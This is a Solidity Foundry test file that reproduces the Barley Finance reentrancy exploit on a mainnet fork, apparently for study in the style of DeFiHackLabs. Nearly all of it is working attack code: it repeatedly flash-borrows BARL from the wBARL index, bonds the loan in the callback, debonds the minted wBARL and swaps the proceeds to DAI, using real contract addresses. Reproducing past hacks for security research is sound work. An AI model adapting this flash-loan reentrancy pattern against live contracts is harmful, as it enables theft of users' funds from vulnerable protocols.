//SPDX-License-Identifier:MIT
pragma solidity 0.8.19;
import "forge-std/Test.sol";
import 'src/interfaces/IERC20.sol';
import "src/interfaces/ICheatCodes.sol";
import "src/interfaces/IUniswapV3Router.sol";
import "src/interfaces/IUniswapV3Pool.sol";
interface IDecentralizedIndex is IERC20 {
  enum IndexType {
    WEIGHTED,
    UNWEIGHTED
  }

  struct IndexAssetInfo {
    address token;
    uint256 weighting;
    uint256 basePriceUSDX96;
    address c1; // arbitrary contract/address field we can use for an index
    uint256 q1; // arbitrary quantity/number field we can use for an index
  }

  event Create(address indexed newIdx, address indexed wallet);
  event Bond(
    address indexed wallet,
    address indexed token,
    uint256 amountTokensBonded,
    uint256 amountTokensMinted
  );
  event Debond(address indexed wallet, uint256 amountDebonded);
  event AddLiquidity(
    address indexed wallet,
    uint256 amountTokens,
    uint256 amountDAI
  );
  event RemoveLiquidity(address indexed wallet, uint256 amountLiquidity);

  function FLASH_FEE_DAI() external view returns (uint256);

  function BOND_FEE() external view returns (uint256); // 1 == 0.01%, 10 == 0.1%, 100 == 1%

  function DEBOND_FEE() external view returns (uint256); // 1 == 0.01%, 10 == 0.1%, 100 == 1%

  function indexType() external view returns (IndexType);

  function created() external view returns (uint256);

  function lpStakingPool() external view returns (address);

  function lpRewardsToken() external view returns (address);

  function getIdxPriceUSDX96() external view returns (uint256, uint256);

  function isAsset(address token) external view returns (bool);

  function getAllAssets() external view returns (IndexAssetInfo[] memory);

  function getTokenPriceUSDX96(address token) external view returns (uint256);

  function bond(address token, uint256 amount) external;

  function debond(
    uint256 amount,
    address[] memory token,
    uint8[] memory percentage
  ) external;

  function addLiquidityV2(
    uint256 idxTokens,
    uint256 daiTokens,
    uint256 slippage
  ) external;

  function removeLiquidityV2(
    uint256 lpTokens,
    uint256 minTokens,
    uint256 minDAI
  ) external;

  function flash(
    address recipient,
    address token,
    uint256 amount,
    bytes calldata data
  ) external;
}

interface IFlashLoanRecipient {
  function callback(bytes calldata data) external;
}
/**
 * @title BarleyExploit
 * @author 0Kage
 * @notice This is a curious case of re-entrancy attack triggered by flash loans
 * references:
 * Fund flow, Phalcon Blocsec - https://phalcon.blocksec.com/explorer/tx/eth/0x995e880635f4a7462a420a58527023f946710167ea4c6c093d7d193062a33b01
 * SunWeb3 Defi - https://github.com/SunWeb3Sec/DeFiHackLabs?tab=readme-ov-file#20240128-barleyfinance---reentrancy
 */
contract BarleyExploit0224 is Test, IFlashLoanRecipient {
    
    IDecentralizedIndex wBARL = IDecentralizedIndex(0x04c80Bb477890F3021F03B068238836Ee20aA0b8);
    address DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    ICheatCodes cheatCodes = ICheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IUniswapV3Router uniV3Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IUniswapV3Pool BARL_DAIPool = IUniswapV3Pool(0x4eb37415B8077e1bfbeE5556A3073592d18F9F4c);

    uint256 mainnetForkId;
    IERC20 daiToken;
    address BARL;

    function setUp() external {
        mainnetForkId = cheatCodes.createFork(cheatCodes.envString("MAINNET_RPC_URL"), 19_106_654);
        cheatCodes.selectFork(mainnetForkId);
        BARL = wBARL.lpRewardsToken();
        daiToken = IERC20(DAI);

        cheatCodes.label(DAI, "DAI");
        cheatCodes.label(address(this), "Attacker");
        cheatCodes.label(address(wBARL), "wBARL");
        cheatCodes.label(BARL, "BARL");
    }

    //@note this test is meant to display the state of the contract, balances, tokens 
      // this will set a context to the actual attack itself
    function test_State() external{
            emit log_named_uint("Bonding Fee:", wBARL.BOND_FEE());
            emit log_named_uint("De-bonding Fee:", wBARL.DEBOND_FEE());
            emit log_named_uint("Flash Fee Fee:", wBARL.FLASH_FEE_DAI()); 

            emit log_named_address("LP Staking Pool:", wBARL.lpStakingPool());
            emit log_named_address("LP Rewards Token:", BARL);

            IDecentralizedIndex.IndexAssetInfo[] memory assets = wBARL.getAllAssets();

            emit log_named_uint("Number of index assets:", assets.length);
            for(uint i = 0; i < assets.length;){
                IDecentralizedIndex.IndexAssetInfo memory asset = assets[i];
                emit log_named_uint("listing asset info for asset with index:", i);
                emit log_named_address("asset token:", asset.token);
                emit log_named_uint("asset weight:", asset.weighting);                
                unchecked{
                    ++i;
                }
            }



    }


    // @note Exploit runs in following steps     
    //1. take a flash loan of lp rewards token from wBarl with a callback that bonds those tokens
    //2. debond the minted wBarl and get back the lp rewards token
    //3. Go to uniswap and redeem the lp rewards token 
 
    function test_BarleyExploit() external {

      // 0. deal yourself some DAI team
      deal(DAI, address(this), 500 ether); // begin attack with 1000 DAI
      uint256 daiBalanceBefore = daiToken.balanceOf(address(this));
      emit log_named_uint("Initial DAI balance in attacker contract", daiBalanceBefore /1 ether);
      assertEq(daiBalanceBefore, 500 ether);

      emit log_named_string("BAI-DARL Pool state before attack:", "-------------------------");
      _getPoolParams(BARL_DAIPool);
      _getPoolState(BARL_DAIPool);
      emit log_named_string("-----------------------------", "-------------------------");      
      
      //1. take a flash loan of entire lpRewardToken balance
      //1.1 give allowance for smooth functioning
      daiToken.approve(address(wBARL),type(uint256).max);
      IERC20(BARL).approve(address(wBARL), type(uint256).max);

      for(uint miseryCtr; miseryCtr < 10;){

        //1.2 now raise a flash loan
        wBARL.flash(address(this), BARL, IERC20(BARL).balanceOf(address(wBARL)), "");
        uint256 wBarlBalanceAfter = wBARL.balanceOf(address(this));
        emit log_named_uint("wBARL debonded in this iteration: ", wBarlBalanceAfter / 1 ether);

        //2. debond all the wBARL received
        address[] memory dummyAddys = new address[](0);
        uint8[] memory dummyIndx = new uint8[](0);     
        wBARL.debond(wBarlBalanceAfter, dummyAddys, dummyIndx);
        
        //3. swap the lpReward token into DAI
        _swapLpTokenToDai(BARL, IERC20(BARL).balanceOf(address(this)), address(this), BARL_DAIPool.fee()); 
        emit log_named_uint("Pool balance in this iteration: ", miseryCtr);
        _getPoolState(BARL_DAIPool);
        unchecked {
            ++miseryCtr;
        }
        emit log_named_uint("DAI Balance in this iteration: ", daiToken.balanceOf(address(this)) / 1 ether);     
      }
 
    }

    function test_PoolState() external{
      _getPoolParams(BARL_DAIPool);
      _getPoolState(BARL_DAIPool);
    }
    
    function callback(bytes calldata) external { // callback gets triggered on flash loan issuance

      wBARL.bond(BARL, IERC20(BARL).balanceOf(address(this))); // bond entire flash loan balance to the wBARL contract
    }

    function _swapLpTokenToDai(address token, uint256 amount, address recipient, uint24 fee) internal returns(uint daiOutput){

        IERC20(token).approve(address(uniV3Router), amount); 

        bytes memory swapPath = abi.encodePacked(token, fee, DAI);
        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router.ExactInputParams({
                                                                    path: swapPath,
                                                                    recipient: recipient,
                                                                    deadline: block.timestamp + 100,
                                                                    amountIn: amount,
                                                                    amountOutMinimum: 0
                                                                  }); // @note amountOutMinimum = 0 could be harmful 

        daiOutput = uniV3Router.exactInput(params);
    }
    
    function _getPoolParams(IUniswapV3Pool pool) internal {
      emit log_named_address("token 0", pool.token0());
      emit log_named_address("token 1", pool.token1());
      emit log_named_uint("fee", pool.fee());

      (uint256 price,,,,,,) = pool.slot0();
      emit log_named_uint("sqrt price X96", price);
    }

    function _getPoolState(IUniswapV3Pool pool) internal {
      emit log_named_uint("token 0 (BARL) balance", IERC20(pool.token0()).balanceOf(address(pool)) / 1 ether);
      emit log_named_uint("token 1 (DAI) balance", IERC20(pool.token1()).balanceOf(address(pool)) / 1 ether);       
    }


}